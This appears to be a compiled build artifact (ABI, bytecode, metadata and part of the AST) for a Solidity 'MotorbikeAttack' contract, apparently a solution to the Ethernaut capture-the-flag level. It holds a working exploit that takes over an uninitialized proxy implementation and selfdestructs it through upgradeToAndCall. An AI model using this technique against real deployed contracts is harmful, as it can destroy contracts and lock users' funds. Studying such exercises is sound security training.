{"abi":[{"type":"constructor","inputs":[{"name":"impl","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"destroy","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"implementation","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"takeControl","inputs":[],"outputs":[{"name":"","type":"bytes","internalType":"bytes"}],"stateMutability":"nonpayable"},{"type":"function","name":"validateItIsBroken","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"Check","inputs":[{"name":"result","type":"bool","indexed":false,"internalType":"bool"}],"anonymous":false}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516106973803806106978339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610632806100656000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80635c60da1b1461005157806383197ef01461007557806390aa66841461007f5780639185873414610087575b600080fd5b610059610104565b604080516001600160a01b039092168252519081900360200190f35b61007d610113565b005b61007d610245565b61008f610291565b6040805160208082528351818301528351919283929083019185019080838360005b838110156100c95781810151838201526020016100b1565b50505050905090810190601f1680156100f65780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6000546001600160a01b031681565b60006040516101219061053f565b604051809103906000f08015801561013d573d6000803e3d6000fd5b50600080546040805160048152602480820183526020820180516001600160e01b031663204a7f0760e21b17815283516001600160a01b03808916938201938452604482019586528451606483015284519899506102419896169689969495939460849092019291908190849084905b838110156101c55781810151838201526020016101ad565b50505050905090810190601f1680156101f25780820380516001836020036101000a031916815260200191505b5060408051601f198184030181529190526020810180516001600160e01b03167f4f1ef2860000000000000000000000000000000000000000000000000000000017905293506102d992505050565b5050565b6000547f0f806f3a69aebe25b6129d19609333999fb4d2aed709217d19e0465d3bf3e72e9061027c906001600160a01b0316610322565b604080519115158252519081900360200190a1565b6000546040805160048152602481019091526020810180516001600160e01b031663204a7f0760e21b1790526060916102d5916001600160a01b03909116906102d9565b5090565b606061031b83836040518060400160405280601e81526020017f416464726573733a206c6f772d6c6576656c2063616c6c206661696c65640000815250610328565b9392505050565b3b151590565b6060610337848460008561033f565b949350505050565b6060824710156103805760405162461bcd60e51b81526004018080602001828103825260268152602001806105d76026913960400191505060405180910390fd5b61038985610322565b6103da576040805162461bcd60e51b815260206004820152601d60248201527f416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000604482015290519081900360640190fd5b60006060866001600160a01b031685876040518082805190602001908083835b602083106104195780518252601f1990920191602091820191016103fa565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d806000811461047b576040519150601f19603f3d011682016040523d82523d6000602084013e610480565b606091505b509150915061049082828661049b565b979650505050505050565b606083156104aa57508161031b565b8251156104ba5782518084602001fd5b8160405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b838110156105045781810151838201526020016104ec565b50505050905090810190601f1680156105315780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b608b8061054c8339019056fe6080604052348015600f57600080fd5b50606e80601d6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638129fc1c14602d575b600080fd5b60336035565b005b33fffea2646970667358221220a5b81b09d489c90d1c264324025fad20729e72e3058b3993bc7833261473f2f064736f6c634300060c0033416464726573733a20696e73756666696369656e742062616c616e636520666f722063616c6ca2646970667358221220a7d76e8f4a8e4e1e38491c406a97779968f13ffa8bfdf9978b8868759c77e22664736f6c634300060c0033","sourceMap":"113:919:5:-:0;;;265:71;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;265:71:5;308:14;:21;;-1:-1:-1;;;;;308:21:5;;;-1:-1:-1;;;;;;308:21:5;;;;;;;;;113:919;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405234801561001057600080fd5b506004361061004c5760003560e01c80635c60da1b1461005157806383197ef01461007557806390aa66841461007f5780639185873414610087575b600080fd5b610059610104565b604080516001600160a01b039092168252519081900360200190f35b61007d610113565b005b61007d610245565b61008f610291565b6040805160208082528351818301528351919283929083019185019080838360005b838110156100c95781810151838201526020016100b1565b50505050905090810190601f1680156100f65780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6000546001600160a01b031681565b60006040516101219061053f565b604051809103906000f08015801561013d573d6000803e3d6000fd5b50600080546040805160048152602480820183526020820180516001600160e01b031663204a7f0760e21b17815283516001600160a01b03808916938201938452604482019586528451606483015284519899506102419896169689969495939460849092019291908190849084905b838110156101c55781810151838201526020016101ad565b50505050905090810190601f1680156101f25780820380516001836020036101000a031916815260200191505b5060408051601f198184030181529190526020810180516001600160e01b03167f4f1ef2860000000000000000000000000000000000000000000000000000000017905293506102d992505050565b5050565b6000547f0f806f3a69aebe25b6129d19609333999fb4d2aed709217d19e0465d3bf3e72e9061027c906001600160a01b0316610322565b604080519115158252519081900360200190a1565b6000546040805160048152602481019091526020810180516001600160e01b031663204a7f0760e21b1790526060916102d5916001600160a01b03909116906102d9565b5090565b606061031b83836040518060400160405280601e81526020017f416464726573733a206c6f772d6c6576656c2063616c6c206661696c65640000815250610328565b9392505050565b3b151590565b6060610337848460008561033f565b949350505050565b6060824710156103805760405162461bcd60e51b81526004018080602001828103825260268152602001806105d76026913960400191505060405180910390fd5b61038985610322565b6103da576040805162461bcd60e51b815260206004820152601d60248201527f416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000604482015290519081900360640190fd5b60006060866001600160a01b031685876040518082805190602001908083835b602083106104195780518252601f1990920191602091820191016103fa565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d806000811461047b576040519150601f19603f3d011682016040523d82523d6000602084013e610480565b606091505b509150915061049082828661049b565b979650505050505050565b606083156104aa57508161031b565b8251156104ba5782518084602001fd5b8160405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b838110156105045781810151838201526020016104ec565b50505050905090810190601f1680156105315780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b608b8061054c8339019056fe6080604052348015600f57600080fd5b50606e80601d6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638129fc1c14602d575b600080fd5b60336035565b005b33fffea2646970667358221220a5b81b09d489c90d1c264324025fad20729e72e3058b3993bc7833261473f2f064736f6c634300060c0033416464726573733a20696e73756666696369656e742062616c616e636520666f722063616c6ca2646970667358221220a7d76e8f4a8e4e1e38491c406a97779968f13ffa8bfdf9978b8868759c77e22664736f6c634300060c0033","sourceMap":"113:919:5:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;198:29;;;:::i;:::-;;;;-1:-1:-1;;;;;198:29:5;;;;;;;;;;;;;;537:385;;;:::i;:::-;;928:102;;;:::i;342:189::-;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;198:29;;;-1:-1:-1;;;;;198:29:5;;:::o;537:385::-;654:15;672:13;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;730:14:5;;;852:39;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;852:39:5;-1:-1:-1;;;852:39:5;;;758:147;;-1:-1:-1;;;;;758:147:5;;;;;;;;;;;;;;;;;;;;;;;654:31;;-1:-1:-1;696:219:5;;730:14;;;654:31;;852:39;;758:147;;;;;;;852:39;758:147;;;;;852:39;;758:147;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;758:147:5;;;-1:-1:-1;;758:147:5;;;;;;;;;;;;;;-1:-1:-1;;;;;758:147:5;;;;;;-1:-1:-1;696:20:5;;-1:-1:-1;;;696:219:5:i;:::-;;537:385;:::o;928:102::-;1007:14;;982:41;;988:34;;-1:-1:-1;;;;;1007:14:5;988:18;:34::i;:::-;982:41;;;;;;;;;;;;;;;;;928:102::o;342:189::-;468:14;;484:39;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;484:39:5;-1:-1:-1;;;484:39:5;;;383:12;;447:77;;-1:-1:-1;;;;;468:14:5;;;;447:20;:77::i;:::-;;342:189;:::o;3188:171:3:-;3263:12;3292:60;3305:6;3313:4;3292:60;;;;;;;;;;;;;;;;;:12;:60::i;:::-;3285:67;3188:171;-1:-1:-1;;;3188:171:3:o;726:413::-;1086:20;1124:8;;;726:413::o;3581:193::-;3684:12;3715:52;3737:6;3745:4;3751:1;3754:12;3715:21;:52::i;:::-;3708:59;3581:193;-1:-1:-1;;;;3581:193:3:o;4608:523::-;4735:12;4792:5;4767:21;:30;;4759:81;;;;-1:-1:-1;;;4759:81:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4858:18;4869:6;4858:10;:18::i;:::-;4850:60;;;;;-1:-1:-1;;;4850:60:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;4981:12;4995:23;5022:6;-1:-1:-1;;;;;5022:11:3;5042:5;5050:4;5022:33;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;5022:33:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4980:75;;;;5072:52;5090:7;5099:10;5111:12;5072:17;:52::i;:::-;5065:59;4608:523;-1:-1:-1;;;;;;;4608:523:3:o;7091:725::-;7206:12;7234:7;7230:580;;;-1:-1:-1;7264:10:3;7257:17;;7230:580;7375:17;;:21;7371:429;;7633:10;7627:17;7693:15;7680:10;7676:2;7672:19;7665:44;7582:145;7772:12;7765:20;;-1:-1:-1;;;7765:20:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;;;;:::o","linkReferences":{}},"methodIdentifiers":{"destroy()":"83197ef0","implementation()":"5c60da1b","takeControl()":"91858734","validateItIsBroken()":"90aa6684"},"rawMetadata":"{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"impl\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"result\",\"type\":\"bool\"}],\"name\":\"Check\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"destroy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"implementation\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeControl\",\"outputs\":[{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"validateItIsBroken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/attacks/MotorbikeAttack.sol\":\"MotorbikeAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"lib/openzeppelin-contracts-06/contracts/utils/Address.sol\":{\"keccak256\":\"0x28911e614500ae7c607a432a709d35da25f3bc5ddc8bd12b278b66358070c0ea\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://256c8c8af5eb072bc473226ab2b2187149b8fc04f5f4a4820db22527f5ce8e3c\",\"dweb:/ipfs/QmRvi5BhnL7Rxf85KrJhwM6RRhukm4tzoctRdgQEheNyiN\"]},\"src/attacks/MotorbikeAttack.sol\":{\"keccak256\":\"0x132aa9c7710a7bdedfd0ef511e61e261494a997af5dcdbc7d5e7276fbc2db084\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://24ebef00e24106b2f16595102b73856021a543f7635be505e24388e346cba44a\",\"dweb:/ipfs/QmUpFm8JTrkBtc7rjyHZFZFY1EJx4YMH1nr7seZb3pkULa\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.6.12+commit.27d51765"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"impl","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"bool","name":"result","type":"bool","indexed":false}],"type":"event","name":"Check","anonymous":false},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"destroy"},{"inputs":[],"stateMutability":"view","type":"function","name":"implementation","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"takeControl","outputs":[{"internalType":"bytes","name":"","type":"bytes"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"validateItIsBroken"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/attacks/MotorbikeAttack.sol":"MotorbikeAttack"},"evmVersion":"istanbul","libraries":{}},"sources":{"lib/openzeppelin-contracts-06/contracts/utils/Address.sol":{"keccak256":"0x28911e614500ae7c607a432a709d35da25f3bc5ddc8bd12b278b66358070c0ea","urls":["bzz-raw://256c8c8af5eb072bc473226ab2b2187149b8fc04f5f4a4820db22527f5ce8e3c","dweb:/ipfs/QmRvi5BhnL7Rxf85KrJhwM6RRhukm4tzoctRdgQEheNyiN"],"license":"MIT"},"src/attacks/MotorbikeAttack.sol":{"keccak256":"0x132aa9c7710a7bdedfd0ef511e61e261494a997af5dcdbc7d5e7276fbc2db084","urls":["bzz-raw://24ebef00e24106b2f16595102b73856021a543f7635be505e24388e346cba44a","dweb:/ipfs/QmUpFm8JTrkBtc7rjyHZFZFY1EJx4YMH1nr7seZb3pkULa"],"license":"MIT"}},"version":1},"ast":{"absolutePath":"src/attacks/MotorbikeAttack.sol","id":935,"exportedSymbols":{"Exploit":[934],"MotorbikeAttack":[924]},"nodeType":"SourceUnit","src":"33:1099:5","nodes":[{"id":851,"nodeType":"PragmaDirective","src":"33:23:5","nodes":[],"literals":["solidity","<","0.7",".0"]},{"id":852,"nodeType":"ImportDirective","src":"58:53:5","nodes":[],"absolutePath":"lib/openzeppelin-contracts-06/contracts/utils/Address.sol","file":"openzeppelin-contracts-06/utils/Address.sol","scope":935,"sourceUnit":827,"symbolAliases":[],"unitAlias":""},{"id":924,"nodeType":"ContractDefinition","src":"113:919:5","nodes":[{"id":854,"nodeType":"VariableDeclaration","src":"198:29:5","nodes":[],"constant":false,"functionSelector":"5c60da1b","mutability":"mutable","name":"implementation","overrides":null,"scope":924,"stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":853,"name":"address","nodeType":"ElementaryTypeName","src":"198:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"value":null,"visibility":"public"},{"id":858,"nodeType":"EventDefinition","src":"234:25:5","nodes":[],"anonymous":false,"documentation":null,"name":"Check","parameters":{"id":857,"nodeType":"ParameterList","parameters":[{"constant":false,"id":856,"indexed":false,"mutability":"mutable","name":"result","nodeType":"VariableDeclaration","overrides":null,"scope":858,"src":"246:11:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":855,"name":"bool","nodeType":"ElementaryTypeName","src":"246:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"value":null,"visibility":"internal"}],"src":"245:13:5"}},{"id":868,"nodeType":"FunctionDefinition","src":"265:71:5","nodes":[],"body":{"id":867,"nodeType":"Block","src":"298:38:5","nodes":[],"statements":[{"expression":{"argumentTypes":null,"id":865,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"argumentTypes":null,"id":863,"name":"implementation","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":854,"src":"308:14:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"argumentTypes":null,"id":864,"name":"impl","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":860,"src":"325:4:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"308:21:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":866,"nodeType":"ExpressionStatement","src":"308:21:5"}]},"documentation":null,"implemented":true,"kind":"constructor","modifiers":[],"name":"","overrides":null,"parameters":{"id":861,"nodeType":"ParameterList","parameters":[{"constant":false,"id":860,"mutability":"mutable","name":"impl","nodeType":"VariableDeclaration","overrides":null,"scope":868,"src":"277:12:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":859,"name":"address","nodeType":"ElementaryTypeName","src":"277:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"value":null,"visibility":"internal"}],"src":"276:14:5"},"returnParameters":{"id":862,"nodeType":"ParameterList","parameters":[],"src":"298:0:5"},"scope":924,"stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"id":884,"nodeType":"FunctionDefinition","src":"342:189:5","nodes":[],"body":{"id":883,"nodeType":"Block","src":"397:134:5","nodes":[],"statements":[{"expression":{"argumentTypes":null,"arguments":[{"argumentTypes":null,"id":876,"name":"implementation","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":854,"src":"468:14:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"argumentTypes":null,"arguments":[{"argumentTypes":null,"hexValue":"696e697469616c697a652829","id":879,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"508:14:5","subdenomination":null,"typeDescriptions":{"typeIdentifier":"t_stringliteral_8129fc1cf5a76b8b9d76c7ab5059b1685decddb2380c6e4cebb774b7c17ae83f","typeString":"literal_string \"initialize()\""},"value":"initialize()"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_8129fc1cf5a76b8b9d76c7ab5059b1685decddb2380c6e4cebb774b7c17ae83f","typeString":"literal_string \"initialize()\""}],"expression":{"argumentTypes":null,"id":877,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"484:3:5","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":878,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"encodeWithSignature","nodeType":"MemberAccess","referencedDeclaration":null,"src":"484:23:5","typeDescriptions":{"typeIdentifier":"t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (string memory) pure returns (bytes memory)"}},"id":880,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"484:39:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"argumentTypes":null,"id":873,"name":"Address","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":826,"src":"447:7:5","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Address_$826_$","typeString":"type(library Address)"}},"id":875,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"functionCall","nodeType":"MemberAccess","referencedDeclaration":601,"src":"447:20:5","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_bytes_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bytes memory) returns (bytes memory)"}},"id":881,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"447:77:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":882,"nodeType":"ExpressionStatement","src":"447:77:5"}]},"documentation":null,"functionSelector":"91858734","implemented":true,"kind":"function","modifiers":[],"name":"takeControl","overrides":null,"parameters":{"id":869,"nodeType":"ParameterList","parameters":[],"src":"362:2:5"},"returnParameters":{"id":872,"nodeType":"ParameterList","parameters":[{"constant":false,"id":871,"mutability":"mutable","name":"","nodeType":"VariableDeclaration","overrides":null,"scope":884,"src":"383:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":870,"name":"bytes","nodeType":"ElementaryTypeName","src":"383:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"value":null,"visibility":"internal"}],"src":"382:14:5"},"scope":924,"stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"id":912,"nodeType":"FunctionDefinition","src":"537:385:5","nodes":[],"body":{"id":911,"nodeType":"Block","src":"565:357:5","nodes":[],"statements":[{"assignments":[888],"declarations":[{"constant":false,"id":888,"mutability":"mutable","name":"exploit","nodeType":"VariableDeclaration","overrides":null,"scope":911,"src":"654:15:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_Exploit_$934","typeString":"contract Exploit"},"typeName":{"contractScope":null,"id":887,"name":"Exploit","nodeType":"UserDefinedTypeName","referencedDeclaration":934,"src":"654:7:5","typeDescriptions":{"typeIdentifier":"t_contract$_Exploit_$934","typeString":"contract Exploit"}},"value":null,"visibility":"internal"}],"id":892,"initialValue":{"argumentTypes":null,"arguments":[],"expression":{"argumentTypes":[],"id":890,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"NewExpression","src":"672:11:5","typeDescriptions":{"typeIdentifier":"t_function_creation_nonpayable$__$returns$_t_contract$_Exploit_$934_$","typeString":"function () returns (contract Exploit)"},"typeName":{"contractScope":null,"id":889,"name":"Exploit","nodeType":"UserDefinedTypeName","referencedDeclaration":934,"src":"676:7:5","typeDescriptions":{"typeIdentifier":"t_contract$_Exploit_$934","typeString":"contract Exploit"}}},"id":891,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"672:13:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_Exploit_$934","typeString":"contract Exploit"}},"nodeType":"VariableDeclarationStatement","src":"654:31:5"},{"expression":{"argumentTypes":null,"arguments":[{"argumentTypes":null,"id":896,"name":"implementation","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":854,"src":"730:14:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"argumentTypes":null,"arguments":[{"argumentTypes":null,"hexValue":"75706772616465546f416e6443616c6c28616464726573732c627974657329","id":899,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"799:33:5","subdenomination":null,"typeDescriptions":{"typeIdentifier":"t_stringliteral_4f1ef2866b98625bdfefae89411f7a82754ac4089eff8e78c8832329a538337f","typeString":"literal_string \"upgradeToAndCall(address,bytes)\""},"value":"upgradeToAndCall(address,bytes)"},{"argumentTypes":null,"arguments":[{"argumentTypes":null,"id":902,"name":"exploit","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":888,"src":"842:7:5","typeDescriptions":{"typeIdentifier":"t_contract$_Exploit_$934","typeString":"contract Exploit"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Exploit_$934","typeString":"contract Exploit"}],"id":901,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"834:7:5","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":900,"name":"address","nodeType":"ElementaryTypeName","src":"834:7:5","typeDescriptions":{"typeIdentifier":null,"typeString":null}}},"id":903,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"834:16:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"argumentTypes":null,"arguments":[{"argumentTypes":null,"hexValue":"696e697469616c697a652829","id":906,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"876:14:5","subdenomination":null,"typeDescriptions":{"typeIdentifier":"t_stringliteral_8129fc1cf5a76b8b9d76c7ab5059b1685decddb2380c6e4cebb774b7c17ae83f","typeString":"literal_string \"initialize()\""},"value":"initialize()"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_8129fc1cf5a76b8b9d76c7ab5059b1685decddb2380c6e4cebb774b7c17ae83f","typeString":"literal_string \"initialize()\""}],"expression":{"argumentTypes":null,"id":904,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"852:3:5","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":905,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"encodeWithSignature","nodeType":"MemberAccess","referencedDeclaration":null,"src":"852:23:5","typeDescriptions":{"typeIdentifier":"t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (string memory) pure returns (bytes memory)"}},"id":907,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"852:39:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_4f1ef2866b98625bdfefae89411f7a82754ac4089eff8e78c8832329a538337f","typeString":"literal_string \"upgradeToAndCall(address,bytes)\""},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"argumentTypes":null,"id":897,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"758:3:5","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":898,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"encodeWithSignature","nodeType":"MemberAccess","referencedDeclaration":null,"src":"758:23:5","typeDescriptions":{"typeIdentifier":"t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (string memory) pure returns (bytes memory)"}},"id":908,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"758:147:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"argumentTypes":null,"id":893,"name":"Address","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":826,"src":"696:7:5","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Address_$826_$","typeString":"type(library Address)"}},"id":895,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"functionCall","nodeType":"MemberAccess","referencedDeclaration":601,"src":"696:20:5","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_bytes_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bytes memory) returns (bytes memory)"}},"id":909,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"696:219:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes 